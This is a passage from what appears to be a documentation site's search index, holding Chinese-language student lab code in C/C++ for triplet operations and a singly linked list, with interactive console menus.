\u4e24\u4e2a\u4e09\u5143\u7ec4\u7684\u5bf9\u5e94\u5206\u91cf\u52a0\u51cf\u4e58\u9664    **\\n\");\n    printf(\"**       10:multip          \u4e09\u5143\u7ec4\u7684\u5404\u5206\u91cf\u540c\u4e58\u4e00\u4e2a\u6bd4\u4f8b\u56e0\u5b50  **\\n\");\n    printf(\"**       0: \u9000\u51fa                                            **\\n\");\n    printf(\"**                                                          **\\n\");\n    printf(\"**************************************************************\\n\");\n}\n\n\nvoid displayTriplet(Triplet&amp; trip) {\n    cout &lt;&lt; \"Triplet (elem[0]: \" &lt;&lt; trip.elem[0] &lt;&lt; \" elem[1]: \" &lt;&lt; trip.elem[1] &lt;&lt; \" elem[2]: \" &lt;&lt; trip.elem[2] &lt;&lt; endl;\n}\n\n\nvoid initTriplet(Triplet&amp; trip, ElemType aa, ElemType bb, ElemType cc) {\n    trip.elem = (ElemType*)malloc(3 * sizeof(ElemType));\n\n    if (trip.elem == NULL) {\n        printf(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\\n\");\n        exit(1);\n    }\n\n    trip.elem[0] = aa;\n    trip.elem[1] = bb;\n    trip.elem[2] = cc;\n\n}\n\n\nint getElem(Triplet&amp; trip, int index, ElemType* getValue) {\n    if (index &lt; 1 || index &gt; 3) {\n        printf(\"\u7d22\u5f15\u503c\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff1a\\n\");\n        scanf(\"%d\", &amp;index);\n\n        while (index &lt; 1 || index &gt; 3) {\n            printf(\"\u7d22\u5f15\u503c\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff1a\\n\");\n            scanf(\"%d\", &amp;index);\n        }\n    }\n\n    switch (index) {\n    case 1:\n        *getValue = trip.elem[0];\n        break;\n    case 2:\n        *getValue = trip.elem[1];\n        break;\n    case 3:\n        *getValue = trip.elem[2];\n        break;\n    default:\n        printf(\"\u65e0\u6548\u7684\u7d22\u5f15\\n\");\n        exit(1);\n\n        return 0;\n    }\n}\n\n\nvoid putElem(Triplet&amp; trip, int index, ElemType putValue) {\n    if (index &lt; 1 || index &gt; 3) {\n        printf(\"\u7d22\u5f15\u503c\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff1a\\n\");\n        scanf(\"%d\", &amp;index);\n\n        while (index &lt; 1 || index &gt; 3) {\n            printf(\"\u7d22\u5f15\u503c\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff1a\\n\");\n            scanf(\"%d\", &amp;index);\n        }\n    }\n\n    switch (index) {\n    case 1:\n        (trip.elem[0]) = putValue;\n        break;\n    case 2:\n        trip.elem[1] = putValue;\n        break;\n    case 3:\n        trip.elem[2] = putValue;\n        break;\n    default:\n        printf(\"\u65e0\u6548\u7684\u7d22\u5f15\\n\");\n        exit(1);\n    }\n}\n\n\nbool isSameValue(Triplet&amp; trip) {\n    if (trip.elem[0] == trip.elem[1] &amp;&amp; trip.elem[1] == trip.elem[2]) {\n        return true;\n    }\n    else {\n        return false;\n    }\n}\n\n\nbool isAscending(Triplet&amp; trip) {\n    return(trip.elem[0] &lt;= trip.elem[1] &amp;&amp; trip.elem[1] &lt;= trip.elem[2]);\n}\n\n\nbool isDscending(Triplet&amp; trip) {\n    return(trip.elem[0] &gt;= trip.elem[1] &amp;&amp; trip.elem[1] &gt;= trip.elem[2]);\n}\n\n\nElemType getMaxElem(Triplet&amp; trip) {\n    ElemType temp;\n    temp = trip.elem[0] &gt; trip.elem[1] ? trip.elem[0] : trip.elem[1];\n    temp = temp &gt; trip.elem[2] ? temp : trip.elem[2];\n    return temp;\n}\n\n\nElemType getMinElem(Triplet&amp; trip) {\n    ElemType temp;\n    temp = trip.elem[0] &lt; trip.elem[1] ? trip.elem[0] : trip.elem[1];\n    temp = temp &lt; trip.elem[2] ? temp : trip.elem[2];\n    return temp;\n}\n\n\nvoid destroyTriplet(Triplet&amp; trip) {\n    free(trip.elem);\n}\n\n\nvoid addTriplet(Triplet trip1, Triplet trip2, Triplet&amp; result) {\n    result.elem[0] = trip1.elem[0] + trip2.elem[0];\n    result.elem[1] = trip1.elem[1] + trip2.elem[1];\n    result.elem[2] = trip1.elem[2] + trip2.elem[2];\n}\n\n\nvoid subTriplet(Triplet trip1, Triplet trip2, Triplet&amp; result) {\n    result.elem[0] = trip1.elem[0] - trip2.elem[0];\n    result.elem[1] = trip1.elem[1] - trip2.elem[1];\n    result.elem[2] = trip1.elem[2] - trip2.elem[2];\n}\n\n\nvoid multipTriplet(Triplet trip1, Triplet trip2, Triplet&amp; result) {\n    result.elem[0] = trip1.elem[0] * trip2.elem[0];\n    result.elem[1] = trip1.elem[1] * trip2.elem[1];\n    result.elem[2] = trip1.elem[2] * trip2.elem[2];\n}\n\n\nvoid divTriplet(Triplet trip1, Triplet trip2, Triplet&amp; result) {\n    result.elem[0] = trip1.elem[0] / trip2.elem[0];\n    result.elem[1] = trip1.elem[1] / trip2.elem[1];\n    result.elem[2] = trip1.elem[2] / trip2.elem[2];\n}\n\n\nTriplet Work(Triplet&amp; trip) {\n    ElemType aa = NULL, bb = NULL, cc = NULL;\n    Triplet result;\n\n    initTriplet(result, aa, bb, cc);\n    Triplet tripTemp;\n\n    printf(\"--------------------\\n\");\n    printf(\"\u8bf7\u5148\u521d\u59cb\u5316\u7b2c\u4e8c\u4e2a\u4e09\u5143\u7ec4\u3002\\n\");\n    printf(\"\u8bf7\u8f93\u5165\u4e09\u4e2a\u503c\uff0c\u7528\u7a7a\u683c\u5206\u9694\u3002\\n\");\n    // scanf(\"%d %d %d\", &amp;aa, &amp;bb, &amp;cc);\n\n    cin &gt;&gt; aa;\n    cin &gt;&gt; bb;\n    cin &gt;&gt; cc;\n\n    initTriplet(tripTemp, aa, bb, cc);\n    printf(\"\\n\\n\u7b2c\u4e8c\u4e2a\u4e09\u5143\u7ec4\u5982\u4e0b\uff1a\\n\");\n    displayTriplet(tripTemp);\n\n\n    char operate = NULL;\n    printf(\"\\n\\n\u8bf7\u8f93\u5165\u8981\u6267\u884c\u7684\u64cd\u4f5c(+\u3001-\u3001*\u3001/):\\n\");\n    scanf(\" %c\", &amp;operate);\n\n    switch (operate) {\n    case '+':\n        addTriplet(trip, tripTemp, result);\n        break;\n    case '-':\n        subTriplet(trip, tripTemp, result);\n        break;\n    case '*':\n        multipTriplet(trip, tripTemp, result);\n        break;\n    case '/':\n        if (tripTemp.elem[0] == 0 || tripTemp.elem[1] == 0 || tripTemp.elem[2] == 0) {\n            printf(\"\u7b2c\u4e8c\u4e2a\u4e09\u5143\u7ec4\u4e2d\u6709\u975e\u6cd5\u503c\u20180\u2019\uff0c\u65e0\u6cd5\u8fdb\u884c\u8ba1\u7b97\uff01\\n\");\n        }\n        else {\n            divTriplet(trip, tripTemp, result);\n            break;\n        }\n    default:\n        printf(\"\u64cd\u4f5c\u975e\u6cd5\uff01\\n\");\n        break;\n    }\n\n    return result;\n\n}\n\n\nvoid multip(Triplet&amp; trip) {\n    ElemType a;\n    printf(\"\u8bf7\u8f93\u5165\u6bd4\u4f8b\u56e0\u5b50:\");\n    // scanf(\"%d\", &amp;elem);\n    cin &gt;&gt; a;\n\n    trip.elem[0] *= a;\n    trip.elem[1] *= a;\n    trip.elem[2] *= a;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Triplets/#_3","title":"\u7b2c\u4e8c\u79cd\uff1a\u4f2a\u52a8\u6001\uff08\u4e0d\u5b8c\u5584\uff09","text":"C++<pre><code>#define _CRT_SECURE_NO_WARNINGS 1\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define ERROR 0\n#define OK 1\ntypedef int ElemType;\n\n\ntypedef struct {\n    ElemType first;\n    ElemType second;\n    ElemType third;\n}Triplet;\n\n\nvoid displayTriplet(Triplet* trip) {\n    printf(\"Triplet(first:%d, second:%d, third:%d)\\n\", trip-&gt;first, trip-&gt;second, trip-&gt;third);\n}\n\n\nTriplet* createTriplet(ElemType first, ElemType second, ElemType third) {\n    Triplet* trip = (Triplet*)malloc(sizeof(Triplet));\n\n    if (trip == NULL) {\n        printf(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\\n\");\n        exit(1);\n    }\n\n    trip-&gt;first = first;\n    trip-&gt;second = second;\n    trip-&gt;third = third;\n\n    return trip;\n}\n\n\nint getElem(Triplet* trip, int index, ElemType* getValue) {\n    if (index &lt; 1 || index &gt; 3) {\n        printf(\"\u7d22\u5f15\u503c\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff1a\\n\");\n        scanf(\"%d\", &amp;index);\n\n        while (index &lt; 1 || index &gt; 3) {\n            printf(\"\u7d22\u5f15\u503c\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff1a\\n\");\n            scanf(\"%d\", &amp;index);\n        }\n    }\n\n    switch (index) {\n    case 1:\n        *getValue = trip-&gt;first;\n        break;\n    case 2:\n        *getValue = trip-&gt;second;\n        break;\n    case 3:\n        *getValue = trip-&gt;third;\n        break;\n    default:\n        printf(\"\u65e0\u6548\u7684\u7d22\u5f15\\n\");\n        exit(1);\n\n        return 0;\n    }\n}\n\n\nvoid putElem(Triplet* trip, int index, ElemType * putValue) {\n    if (index &lt; 1 || index &gt; 3) {\n        printf(\"\u7d22\u5f15\u503c\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff1a\\n\");\n        scanf(\"%d\", &amp;index);\n\n        while (index &lt; 1 || index &gt; 3) {\n            printf(\"\u7d22\u5f15\u503c\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff1a\\n\");\n            scanf(\"%d\", &amp;index);\n        }\n    }\n\n    switch (index) {\n    case 1:\n        trip-&gt;first = *putValue;\n        break;\n    case 2:\n        trip-&gt;second = *putValue;\n        break;\n    case 3:\n        trip-&gt;third = *putValue;\n        break;\n    default:\n        printf(\"\u65e0\u6548\u7684\u7d22\u5f15\\n\");\n        exit(1);\n    }\n}\n\n\nbool isSameValue(Triplet* trip) {\n    if (trip-&gt;first == trip-&gt;second &amp;&amp; trip-&gt;second == trip-&gt;third) {\n        return 1;\n    }\n    else {\n        return 0;\n    }\n}\n\n\nbool isAscending(Triplet* trip) {\n    return(trip-&gt;first &lt;= trip-&gt;second &amp;&amp; trip-&gt;second &lt;= trip-&gt;third);\n}\n\n\nbool isDscending(Triplet* trip) {\n    return(trip-&gt;first &gt;= trip-&gt;second &amp;&amp; trip-&gt;second &gt;= trip-&gt;third);\n\n}\n\n\nElemType getMaxElem(Triplet* trip) {\n    ElemType temp;\n    temp = trip-&gt;first &gt; trip-&gt;second ? trip-&gt;first : trip-&gt;second;\n    temp = temp &gt; trip-&gt;third ? temp : trip-&gt;third;\n    return temp;\n}\n\n\nElemType getMinElem(Triplet* trip) {\n    ElemType temp;\n    temp = trip-&gt;first &lt; trip-&gt;second ? trip-&gt;first : trip-&gt;second;\n    temp = temp &lt; trip-&gt;third ? temp : trip-&gt;third;\n    return temp;\n}\n\n\nvoid destroyTriplet(Triplet* trip) {\n    free(trip);\n}\n\n\nvoid addTriplet(Triplet* trip1, Triplet* trip2, Triplet* result) {\n    result-&gt;first = trip1-&gt;first + trip2-&gt;first;\n    result-&gt;second = trip1-&gt;second + trip2-&gt;second;\n    result-&gt;third = trip1-&gt;third + trip2-&gt;third;\n}\n\nvoid subTriplet(Triplet* trip1, Triplet* trip2, Triplet* result) {\n    result-&gt;first = trip1-&gt;first - trip2-&gt;first;\n    result-&gt;second = trip1-&gt;second - trip2-&gt;second;\n    result-&gt;third = trip1-&gt;third - trip2-&gt;third;\n}\n\nvoid multipTriplet(Triplet* trip1, Triplet* trip2, Triplet* result) {\n    result-&gt;first = trip1-&gt;first * trip2-&gt;first;\n    result-&gt;second = trip1-&gt;second * trip2-&gt;second;\n    result-&gt;third = trip1-&gt;third * trip2-&gt;third;\n}\n\nvoid divTriplet(Triplet* trip1, Triplet* trip2, Triplet* result) {\n    result-&gt;first = trip1-&gt;first / trip2-&gt;first;\n    result-&gt;second = trip1-&gt;second / trip2-&gt;second;\n    result-&gt;third = trip1-&gt;third / trip2-&gt;third;\n}\n\nTriplet* Work(Triplet* trip) {\n    ElemType aa = NULL, bb = NULL, cc = NULL;\n    Triplet* result = createTriplet(NULL, NULL, NULL);\n    Triplet* tripTemp;\n\n    printf(\"--------------------\\n\");\n    printf(\"\u8bf7\u5148\u521d\u59cb\u5316\u7b2c\u4e8c\u4e2a\u4e09\u5143\u7ec4\u3002\\n\");\n    printf(\"\u8bf7\u8f93\u5165\u4e09\u4e2a\u503c\uff0c\u7528\u7a7a\u683c\u5206\u9694\u3002\\n\");\n    scanf(\"%d %d %d\", &amp;aa, &amp;bb, &amp;cc);\n\n\n\n    tripTemp = createTriplet(aa, bb, cc);\n    printf(\"\\n\\n\u7b2c\u4e8c\u4e2a\u4e09\u5143\u7ec4\u5982\u4e0b\uff1a\\n\");\n    displayTriplet(tripTemp);\n\n\n    char operate = NULL;\n    printf(\"\\n\\n\u8bf7\u8f93\u5165\u8981\u6267\u884c\u7684\u64cd\u4f5c(+\u3001-\u3001*\u3001/):\\n\");\n    scanf(\" %c\", &amp;operate);\n\n    switch (operate) {\n    case '+':\n        addTriplet(trip, tripTemp, result);\n        break;\n    case '-':\n        subTriplet(trip, tripTemp, result);\n        break;\n    case '*':\n        multipTriplet(trip, tripTemp, result);\n        break;\n    case '/':\n        if (tripTemp-&gt;first == 0 || tripTemp-&gt;second == 0 || tripTemp-&gt;third == 0) {\n            printf(\"\u7b2c\u4e8c\u4e2a\u4e09\u5143\u7ec4\u4e2d\u6709\u975e\u6cd5\u503c\u20180\u2019\uff0c\u65e0\u6cd5\u8fdb\u884c\u8ba1\u7b97\uff01\\n\");\n        }\n        else {\n            divTriplet(trip, tripTemp, result);\n            break;\n        }\n    default:\n        printf(\"\u64cd\u4f5c\u975e\u6cd5\uff01\\n\");\n        break;\n    }\n\n    return result;\n}\n\n\nvoid multip(Triplet* trip) {\n    ElemType elem;\n    printf(\"\u8bf7\u8f93\u5165\u6bd4\u4f8b\u56e0\u5b50:\");\n    scanf(\"%d\", &amp;elem);\n\n    trip-&gt;first *= elem;\n    trip-&gt;second *= elem;\n    trip-&gt;third *= elem;\n}\n\n\nvoid Menu(){\n    printf(\"------------------------------\\n\");\n    printf(\"&lt;-- \u8bf7\u9009\u62e9\u4f60\u7684\u64cd\u4f5c\uff1a--&gt;\\n\");\n    printf(\"1: DestroyTriplet  \u9500\u6bc1\u4e09\u5143\u7ec4\\n\");\n    printf(\"2: displayTriplet  \u6253\u5370\u4e09\u5143\u7ec4\\n\");\n    printf(\"3: getElem         \u67e5\u770b\u4e09\u5143\u7ec4\u4e2d\u7684\u7b2cindex\u4e2a\u5143\u7d20\\n\");\n    printf(\"4: putElem         \u4fee\u6539\u4e09\u5143\u7ec4\u7684\u7b2cindex\u4e2a\u5143\u7d20\\n\");\n    printf(\"5: isAscending     \u4e09\u4e2a\u5143\u7d20\u662f\u5426\u5347\u5e8f\\n\");\n    printf(\"6: isDscending     \u4e09\u4e2a\u5143\u7d20\u662f\u5426\u964d\u5e8f\\n\");\n    printf(\"7: getMaxElem      \u8fd4\u56de\u4e09\u4e2a\u5143\u7d20\u4e2d\u7684\u6700\u5927\u503c\\n\");\n    printf(\"8: getMinElem      \u8fd4\u56de\u4e09\u4e2a\u5143\u7d20\u4e2d\u7684\u6700\u5c0f\u503c\\n\");\n    printf(\"9: work            \u4e24\u4e2a\u4e09\u5143\u7ec4\u7684\u5bf9\u5e94\u5206\u91cf\u52a0\u51cf\u4e58\u9664\\n\");\n    printf(\"10:multip          \u4e09\u5143\u7ec4\u7684\u5404\u5206\u91cf\u540c\u4e58\u4e00\u4e2a\u6bd4\u4f8b\u56e0\u5b50\\n\");\n    printf(\"0:\u9000\u51fa              \\n\");\n    printf(\"------------------------------\\n\");\n}\n\n\nint main() {\n\n    printf(\"\u8bf7\u5148\u521d\u59cb\u5316\u4e09\u5143\u7ec4\uff0c\u8bf7\u8f93\u5165\u4e09\u4e2a\u503c\uff0c\u7528\u7a7a\u683c\u5206\u9694\uff1a\\n\");\n    ElemType a, b, c;\n    scanf(\"%d %d %d\", &amp;a, &amp;b, &amp;c);\n    Triplet* trip = createTriplet(a, b, c);\n\n    Menu();\n\n    int function;\n\n    scanf(\"%d\", &amp;function);\n\n\n    while (function != 0) {\n        switch (function) {\n        case 1: {\n            destroyTriplet(trip);\n            printf(\"\u9500\u6bc1\u6210\u529f\uff01\\n\");\n            break;\n        }\n\n        case 2: {\n            displayTriplet(trip);\n\n            printf(\"\\n\u8bf7\u8f93\u5165\u4f60\u7684\u64cd\u4f5c\uff1a\");\n            Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 3: {\n            int index;\n            ElemType getValue;\n            printf(\"\u8bf7\u8f93\u5165\u7d22\u5f15\u503c\uff1a\");\n            scanf(\"%d\", &amp;index);\n\n            getElem(trip, index, &amp;getValue);\n            printf(\"\u4e09\u5143\u7ec4\u4e2d\u7b2c%d\u4e2a\u5143\u7d20\u4e3a%d\\n\", index, getValue);\n\n            printf(\"\\n\u8bf7\u8f93\u5165\u4f60\u7684\u64cd\u4f5c\uff1a\");\n            Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 4: {\n            int index;\n            ElemType putValue;\n\n            printf(\"\u8bf7\u8f93\u5165\u8981\u4fee\u6539\u7684\u5143\u7d20\u7684\u7d22\u5f15\u548c\u503c\uff1a\");\n            scanf(\"%d %d\", &amp;index, &amp;putValue);\n            putElem(trip, index, &amp;putValue);\n\n            printf(\"\u4fee\u6539\u6210\u529f\uff01\");\n            displayTriplet(trip);\n\n            printf(\"\\n\u8bf7\u8f93\u5165\u4f60\u7684\u64cd\u4f5c\uff1a\");\n            Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 5: {\n            if (isSameValue(trip)) {\n                printf(\"\u8be5\u4e09\u5143\u7ec4\u7684\u5143\u7d20\u662f \u76f8\u540c \u7684\u3002\\n\");\n            }\n            else {\n                if (isAscending(trip)) {\n                    printf(\"\u8be5\u4e09\u5143\u7ec4\u7684\u5143\u7d20 \u662f \u5347\u5e8f\u7684\u3002\\n\");\n                }\n                else {\n                    printf(\"\u8be5\u4e09\u5143\u7ec4\u7684\u5143\u7d20 \u4e0d\u662f \u5347\u5e8f\u7684\u3002\\n\");\n                }\n            }\n\n            printf(\"\\n\u8bf7\u8f93\u5165\u4f60\u7684\u64cd\u4f5c\uff1a\");\n            Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 6: {\n            if (isSameValue(trip)) {\n                printf(\"\u8be5\u4e09\u5143\u7ec4\u7684\u5143\u7d20\u662f \u76f8\u540c \u7684\u3002\\n\");\n            }\n            else {\n                if (isDscending(trip)) {\n                    printf(\"\u8be5\u4e09\u5143\u7ec4\u7684\u5143\u7d20 \u662f \u964d\u5e8f\u7684\u3002\\n\");\n                }\n                else {\n                    printf(\"\u8be5\u4e09\u5143\u7ec4\u7684\u5143\u7d20 \u4e0d\u662f \u964d\u5e8f\u7684\u3002\\n\");\n                }\n            }\n\n            printf(\"\\n\u8bf7\u8f93\u5165\u4f60\u7684\u64cd\u4f5c\uff1a\");\n            Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 7: {\n            ElemType Max = getMaxElem(trip);\n            printf(\"\u4e09\u5143\u7ec4\u4e2d\u6700\u5927\u7684\u5143\u7d20\u4e3a\uff1a%d\\n\", Max);\n\n            printf(\"\\n\u8bf7\u8f93\u5165\u4f60\u7684\u64cd\u4f5c\uff1a\");\n            Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 8: {\n            ElemType Min = getMinElem(trip);\n            printf(\"\u4e09\u5143\u7ec4\u4e2d\u6700\u5c0f\u7684\u5143\u7d20\u4e3a\uff1a%d\\n\", Min);\n\n            printf(\"\\n\u8bf7\u8f93\u5165\u4f60\u7684\u64cd\u4f5c\uff1a\");\n            Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 9: {\n            Triplet* result = Work(trip);\n            displayTriplet(result);\n\n            printf(\"\\n\u8bf7\u8f93\u5165\u4f60\u7684\u64cd\u4f5c\uff1a\");\n            Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        case 10: {\n            multip(trip);\n            displayTriplet(trip);\n\n            printf(\"\\n\u8bf7\u8f93\u5165\u4f60\u7684\u64cd\u4f5c\uff1a\");\n            Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        default: {\n            printf(\"\u8f93\u5165\u7684\u503c\u975e\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff1a\\n\");\n\n            Menu();\n            scanf(\"%d\", &amp;function);\n            break;\n        }\n\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E4%BA%8C/","title":"\u5355\u94fe\u8868-\u5b9e\u9a8c\u62a5\u544a\u4e8c","text":""},{"location":"DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E4%BA%8C/#_1","title":"\u529f\u80fd\uff1a","text":"C<pre><code>void Menu() {\n    printf(\"\\n***********************************************\\n\");\n    printf(\"************** \u5b66\u751f\u6210\u7ee9\u7ba1\u7406\u7cfb\u7edf ***************\\n\");\n    printf(\"**                                           **\\n\");\n    printf(\"**       1: SListPushBack  \u5c3e\u63d2\u6570\u636e          **\\n\");\n    printf(\"**       2: SListPushFront \u5934\u63d2\u6570\u636e          **\\n\");\n    printf(\"**       3: SListPopBack   \u5c3e\u5220\u6570\u636e          **\\n\");\n    printf(\"**       4: SListPopFront  \u5934\u5220\u6570\u636e          **\\n\");\n    printf(\"**       5: SListPrint     \u6253\u5370\u5355\u94fe\u8868        **\\n\");\n    printf(\"**       6: ListInsert     \u63d2\u5165\u6570\u636e          **\\n\");\n    printf(\"**       7: FindFromElem   \u7531\u6570\u636e\u67e5\u627e        **\\n\");\n    printf(\"**       8: FindFromIndex  \u7531\u7d22\u5f15\u503c\u67e5\u627e      **\\n\");\n    printf(\"**       9: SListErase     \u5220\u9664\u8282\u70b9          **\\n\");\n    printf(\"**      10: Combine        \u5408\u5e76\u4e24\u4e2a\u5355\u94fe\u8868    **\\n\");\n    printf(\"**      11: ClearSList     \u6e05\u7a7a\u5355\u94fe\u8868        **\\n\");\n    printf(\"**      12: destroyList    \u9500\u6bc1\u5355\u94fe\u8868(\u9000\u51fa)  **\\n\");\n    printf(\"**                                           **\\n\");\n    printf(\"***********************************************\\n\\n\");\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E4%BA%8C/#_2","title":"\u4ee3\u7801\uff1a","text":"C<pre><code>/*\nName:   LinkList.cpp\nAuthor: \u4faf\u9716\u94b0\ndata: 24/03/24 15:23\nDescription: \u5355\u94fe\u7ec4\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\n*/\n\n\n#define _CRT_SECURE_NO_WARNINGS 1\n\n#include &lt;iostream&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef int ElemType;\nint count = 0; // \u8ba1\u6570\n\n// \u5b9a\u4e49\u5355\u94fe\u8868\u7ed3\u70b9\u7ed3\u6784\u4f53\ntypedef struct SListNode {\n    ElemType data;\n    struct SListNode* next;\n} LNode, * LinkList;\n\n\n// \u521d\u59cb\u5316\u5355\u94fe\u8868\nvoid InitList(LinkList* List) {\n    *List = NULL;  // \u521d\u59cb\u65f6\u94fe\u8868\u4e3a\u7a7a\uff0c\u5934\u6307\u9488\u4e3aNULL\n}\n\n\n// \u5c3e\u63d2\u6cd5\u63d2\u5165\u7ed3\u70b9\nvoid SListPushBack(LinkList* pphead, ElemType x) {\n    LinkList newnode = (LinkList)malloc(sizeof(LNode));\n    newnode-&gt;data = x;\n    newnode-&gt;next = NULL;\n\n    if (*pphead == NULL) {\n        *pphead = newnode;\n    }\n    else {\n        LinkList tail = *pphead;\n        while (tail-&gt;next != NULL) {\n            tail = tail-&gt;next;\n        }\n        tail-&gt;next = newnode;\n    }\n\n    count++;\n}\n\n\n// \u5934\u63d2\u6cd5\u63d2\u5165\u7ed3\u70b9\nvoid SListPushFront(LinkList* pphead, ElemType x) {\n    LinkList newnode = (LinkList)malloc(sizeof(LNode));\n    newnode-&gt;data = x;\n    newnode-&gt;next = *pphead;\n    *pphead = newnode;\n\n    count++;\n}\n\n\n// \u5934\u5220\u64cd\u4f5c\nvoid SListPopFront(LinkList* pphead) {\n    if (*pphead == NULL) {\n        printf(\"\u5f53\u524d\u4e3a\u7a7a\u94fe\u8868\uff01\\a\\n\");\n        return;\n    }\n    LinkList next = (*pphead)-&gt;next;\n    free(*pphead);\n    *pphead = next;\n\n    printf(\"\u5220\u9664\u6210\u529f\uff01\\n\");\n    count--;\n}\n\n\n// \u5c3e\u5220\u64cd\u4f5c\nvoid SListPopBack(LinkList* pphead) {\n    if (*pphead == NULL) {\n        printf(\"\u5f53\u524d\u4e3a\u7a7a\u94fe\u8868\uff01\\a\\n\");\n        return;\n    }\n    else if ((*pphead)-&gt;next == NULL) {\n        free(*pphead);\n        *pphead = NULL;\n    }\n    else {\n        LinkList prev = NULL;\n        LinkList tail = *pphead;\n        while (tail-&gt;next != NULL) {\n            prev = tail;\n            tail = tail-&gt;next;\n        }\n        free(tail);\n        prev-&gt;next = NULL;\n    }\n\n    printf(\"\u5220\u9664\u6210\u529f\uff01\\n\");\n    count--;\n}\n\n\n// \u6253\u5370\u5355\u94fe\u8868\nvoid SListPrint(LinkList phead) {\n    LinkList cur = phead;\n    int index = 1;\n    while (cur != NULL) {\n        printf(\"(\u7b2c%d\u4f4d):%d --&gt;\", index, cur-&gt;data);\n        cur = cur-&gt;next;\n        index++;\n    }\n    printf(\"NULL\\n\");\n}\n\n\n// \u5728index\u7684\u524d\u9762\u63d2\u5165x\nvoid SListInsert(LinkList* phead, int index, ElemType x) {\n    if (*phead == NULL) {\n        printf(\"\\n\u5f53\u524d\u94fe\u8868\u4e3a\u7a7a\uff0c\u9ed8\u8ba4\u63d2\u5165\u9996\u4f4d\uff01\\n\");\n        SListPushFront(phead, x);\n        return;\n    }\n\n    index--; // \u56e0\u4e3a\u94fe\u8868\u7684\u9996\u5143\u7d20\u7684\u7d22\u5f15\u503c\u8bbe\u7f6e\u4e3a\u20181\u2019\n\n    LinkList cur = *phead;\n    int num = 1;\n    while (cur != NULL &amp;&amp; num &lt; index) {\n        cur = cur-&gt;next;\n        num++;\n    }\n\n    if (cur == NULL) {\n        printf(\"\u672a\u627e\u5230\u6307\u5b9a\u4f4d\u7f6e\\n\");\n        return;\n    }\n\n    LinkList newnode = (LinkList)malloc(sizeof(LNode));\n    if (newnode == NULL) {\n        printf(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\\a\\n\");\n        return;\n    }\n\n    newnode-&gt;data = x;\n    newnode-&gt;next = cur-&gt;next;\n    cur-&gt;next = newnode;\n\n    count++;\n}\n\n\n// \u5220\u9664\u7d22\u5f15\u4f4d\u7f6e\u7684\u7ed3\u70b9\nvoid SListErase(LinkList* phead, int index) {\n    if (*phead == NULL) {\n        return;\n    }\n\n    index--; // \u56e0\u4e3a\u8bbe\u7f6e\u5355\u94fe\u8868\u9996\u5143\u7d20\u7684\u7d22\u5f15\u503c\u4e3a\u20181\u2019\n\n    if (index == 0) { // \u5220\u9664\u7684\u5143\u7d20\u4e3a\u9996\u5143\u7d20\uff0c\u5176\u5b9e\u76f4\u63a5\u8c03\u7528\u5934\u5220\u5c31\u884c\n        LinkList temp = *phead;\n        *phead = (*phead)-&gt;next;\n        free(temp);\n        count--;\n        return;\n    }\n\n    LinkList prev = *phead;\n    int currIndex = 1;\n    while (prev != NULL &amp;&amp; currIndex &lt; index) {\n        prev = prev-&gt;next;\n        currIndex++;\n    }\n\n    if (prev == NULL || prev-&gt;next == NULL) {\n        printf(\"\u672a\u627e\u5230\u6307\u5b9a\u7ed3\u70b9\\n\");\n        return;\n    }\n\n    LinkList pos = prev-&gt;next;\n    prev-&gt;next = pos-&gt;next;\n    free(pos);\n    count--;\n}\n\n\n// \u5728\u94fe\u8868\u4e2d\u67e5\u627e\u503c\u4e3ax\u7684\u7ed3\u70b9\nint SListFind(LinkList phead, ElemType x) {\n    LinkList cur = phead;\n    int index = 0;\n    while (cur != NULL) {\n        if (cur-&gt;data == x) {\n            return index;\n        }\n        cur = cur-&gt;next;\n        index++;\n    }\n\n    return -1;\n}\n\n\n// \u7531\u7d22\u5f15\u503c\u67e5\u627e\u5143\u7d20\nvoid FindFromIndex(LinkList L, int index) {\n    if (L == NULL || index &lt;= 0) {\n        printf(\"\u4e0d\u5b58\u5728\u7b2c %d \u4f4d\u5143\u7d20\\n\", index);\n        return;\n    }\n\n    LinkList p = L;\n    int i = 0;\n    index--; // \u56e0\u4e3a\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u7d22\u5f15\u503c\u8bbe\u7f6e\u4e3a\u4e86\u20181\u2019\n\n    while (p &amp;&amp; i &lt; index) {\n        p = p-&gt;next;\n        i++;\n    }\n\n    if (i == index &amp;&amp; p) {\n        //printf(\"\u7b2c%d\u4f4d\u5143\u7d20\u662f\uff1a%d\\n\", index, 